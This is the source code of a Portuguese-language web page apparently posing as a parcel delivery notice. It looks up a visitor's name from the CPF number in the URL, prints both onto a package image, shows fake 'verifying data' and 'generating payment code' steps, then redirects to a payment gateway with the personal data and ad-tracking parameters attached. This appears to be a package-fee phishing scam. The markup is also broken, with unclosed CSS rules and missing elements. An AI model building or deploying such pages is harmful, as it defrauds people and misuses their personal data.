<script>
(function () {
  "use strict";

  var STORAGE_KEY = "funil_tracking_params";

  // Parâmetros que serão preservados entre as etapas.
  var TRACKING_PARAMS = [
    "utm_source",
    "utm_medium",
    "utm_campaign",
    "utm_content",
    "utm_term",
    "fbclid"
  ];

  function readStorage(storage) {
    try {
      return JSON.parse(storage.getItem(STORAGE_KEY) || "{}");
    } catch (e) {
      return {};
    }
  }

  function saveStorage(storage, data) {
    try {
      storage.setItem(STORAGE_KEY, JSON.stringify(data));
    } catch (e) {}
  }

  function getSavedParams() {
    var session = readStorage(sessionStorage);
    var local = readStorage(localStorage);

    return Object.assign({}, local, session);
  }

  function saveParams(data) {
    saveStorage(sessionStorage, data);
    saveStorage(localStorage, data);
  }

  // 1. Recupera os parâmetros já salvos.
  var params = getSavedParams();

  // 2. Captura os parâmetros recebidos na URL atual.
  var currentURL = new URL(window.location.href);

  TRACKING_PARAMS.forEach(function (key) {
    var value = currentURL.searchParams.get(key);

    // Atualiza somente se o parâmetro estiver presente
    // e tiver um valor não vazio.
    if (value !== null && value.trim() !== "") {
      params[key] = value;
    }
  });

  // 3. Salva os parâmetros para as próximas páginas.
  saveParams(params);

  // 4. Função global para redirecionar preservando as UTMs.
  window.goToNext = function (nextURL) {
    var destination = new URL(nextURL, window.location.href);
    var saved = getSavedParams();

    // Não substitui parâmetros de tracking já definidos
    // explicitamente na URL de destino.
    TRACKING_PARAMS.forEach(function (key) {
      if (
        saved[key] &&
        !destination.searchParams.has(key)
      ) {
        destination.searchParams.set(key, saved[key]);
      }
    });

    window.location.href = destination.href;
  };

  // 5. Propaga as UTMs automaticamente nos links internos.
  document.addEventListener("click", function (event) {
    var link = event.target.closest("a[href]");

    if (!link) return;
    if (link.target === "_blank") return;
    if (event.ctrlKey || event.metaKey || event.shiftKey) return;
    if (event.button !== 0) return;

    var destination;

    try {
      destination = new URL(link.href, window.location.href);
    } catch (e) {
      return;
    }

    // Só modifica links da mesma origem.
    if (destination.origin !== window.location.origin) return;

    TRACKING_PARAMS.forEach(function (key) {
      if (
        params[key] &&
        !destination.searchParams.has(key)
      ) {
        destination.searchParams.set(key, params[key]);
      }
    });

    link.href = destination.href;
  });

  // Disponibiliza os parâmetros para outros scripts.
  window.getFunilTracking = function () {
    return Object.assign({}, getSavedParams());
  };

})();
</script>

  <style>
    * {
      margin: 0;

    body {

      font-family: Arial, Helvetica, sans-serif;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      padding: 0;
    }

    .email-wrapper {
      width: 100%;
      max-width: 420px;
      background-color: #ffffff;
      box-shadow: 0 2px 8px rgba(0,0,0,0.15);

    /* Header */
    .header-img {
      width: 100%;
      display: block;
    }

    /* Imagem do Topo (Rastreio e Descrição) */
    .top-info-container {
      width: 100%;
      display: block;
    }

    .top-info-container img {
      width: 100%;
      display: block;
      height: auto;
    }

    /* Imagem da Encomenda */
    .package-photo {
      max-width: 85%;
      margin: 0 auto 18px;
      border: 1px solid #dddddd;
      border-radius: 4px;
      overflow: hidden;
      position: relative;
    }

    .package-photo img {
      width: 100%;
      display: block;
      object-fit: cover;
    }

    .package-nome-overlay {
      position: absolute;
      top: 47.5%;
      left: 17%;
      transform: rotate(1deg);
      width: 70%;
      text-align: left;
      font-family: Arial, Helvetica, sans-serif;
      font-size: clamp(0.5rem, 3vw, 0.8rem);
      font-weight: 700;
      color: #1a1a1a;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      line-height: 1.3;
      pointer-events: none;
    }

    .package-cpf-overlay {
      position: absolute;
      top: 56%;
      left: 25%;
      transform: rotate(1deg);
      width: 70%;
      text-align: left;
      font-family: Arial, Helvetica, sans-serif;
      font-size: clamp(0.5rem, 3vw, 0.8rem);
      font-weight: 700;
      color: #1a1a1a;
      letter-spacing: 0.04em;
      pointer-events: none;
    }

    /* Imagem do Aviso Importante */
    .importante-container {
      margin: 0 20px 18px;
      display: block;
    }

    .importante-container img {
      width: 100%;
      display: block;
      height: auto;
    }

    /* Seção do Botão em Imagem */
    .cta-image-wrap {
      padding: 0 20px 22px;
    }

    .cta-image-button {
      display: block;
      width: 100%;
      text-decoration: none;
      border: none;
      cursor: pointer;
    }

    .cta-image-button img {
      width: 100%;
      display: block;
      height: auto;
    }

    /* Footer com Imagem */
    .footer-container {
      width: 100%;
      display: block;
    }

    .footer-container img {
      width: 100%;
      display: block;
      height: auto;
    }

    /* ── Loading overlay ── */
    #loading-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: #ffffff;
      z-index: 9999;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    #loading-overlay.ativo { display: flex; }

    .lo-topo {
      width: 100%;
      height: 4px;
      background: #003087;
      position: absolute;
      top: 0;
      left: 0;
    }
    .lo-barra {
      height: 4px;
      background: #FFCC00;
      width: 0%;
      animation: lo-progress 3s ease-in-out forwards;
    }
    @keyframes lo-progress { 0%{width:0%} 60%{width:75%} 90%{width:90%} 100%{width:95%} }

    .lo-logo-img {
      width: 180px;
      margin-bottom: 28px;
    }
    .lo-divisor {
      width: 180px;
      height: 2px;
      background: #FFCC00;
      margin-bottom: 22px;
    }
    .lo-step {
      font-size: 0.82rem;
      color: #666;
      text-align: center;
      letter-spacing: 0.01em;
      min-height: 1.2em;
    }
    .lo-dots::after {
      content: '';
      animation: lo-dot 1.2s steps(4, end) infinite;
    }
    @keyframes lo-dot {
      0%  { content: ''; }
      25% { content: '.'; }
      50% { content: '..'; }
      75% { content: '...'; }
    }

</div>

<script>
const mensagens = [
    "Verificando seus dados",
    "Localizando encomenda",
    "Gerando código de pagamento"
];

const msg = document.getElementById("lo-msg");

mensagens.forEach((texto, index) => {
    setTimeout(() => {
        msg.textContent = texto;
    }, index * 1200);
});

setTimeout(() => {
    const urlParams = new URLSearchParams(window.location.search);

    const nome = urlParams.get("nome")
        ? decodeURIComponent(urlParams.get("nome"))
        : "";

    const cpf = urlParams.get("cpf")
        ? urlParams.get("cpf")
        : "";

    urlParams.set("name", nome);
    urlParams.set("document", cpf);

const finalUrl =
    "https://pay.sunize.com.br/kcnDqGgU?" +
    urlParams.toString();

    window.location.href = finalUrl;
}, 3600);
</script>

    <div class="top-info-container">

    <div class="package-photo">

  <script>
    const params = new URLSearchParams(location.search);
    const cpf = params.get('cpf') || '';
    let nomeGlobal = '';

    // Carrega nome na imagem
    (async function () {
      if (!cpf) return;
      try {
        const res  = await fetch('/api/consulta?cpf=' + encodeURIComponent(cpf));
        const data = await res.json();
        if (!data.erro && data.dados && data.dados.length > 0) {
          nomeGlobal = data.dados[0].NOME;
          const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
          document.getElementById('texto-nome').textContent = nomeGlobal;
          document.getElementById('texto-cpf').textContent  = cpfFormatado;
        }
      } catch (e) {}
    })();

    // Animação de carregamento ao clicar no botão
    document.getElementById('btn-pagar').addEventListener('click', function (e) {
      e.preventDefault();

      const overlay = document.getElementById('loading-overlay');
      const s1 = document.getElementById('step1');
      const s2 = document.getElementById('step2');
      const s3 = document.getElementById('step3');

      overlay.classList.add('ativo');
      // Reinicia animação da barra
      const barra = document.getElementById('lo-barra');
      barra.style.animation = 'none';
      barra.offsetHeight;
      barra.style.animation = '';

      const msg = document.getElementById('lo-msg');
      setTimeout(function () { msg.textContent = 'Localizando encomenda'; }, 1200);
      setTimeout(function () { msg.textContent = 'Gerando código de pagamento'; }, 2400);

      setTimeout(function () {
        var gatewayBase = 'https://pay.sunize.com.br/kcnDqGgU';
        var urlParams   = new URLSearchParams(window.location.search);
        var utmKeys     = ['utm_source','utm_campaign','utm_medium','utm_content','utm_term','xcod','src','fbclid','sck','subid'];
        var q           = new URLSearchParams();
        utmKeys.forEach(function(k){
          var v = urlParams.get(k) || localStorage.getItem(k) || '';
          if (v) q.set(k, v);
        });
        var qs = q.toString();
        window.location.href = gatewayBase + (qs ? '?' + qs : '');
      }, 1);
    });
  </script>
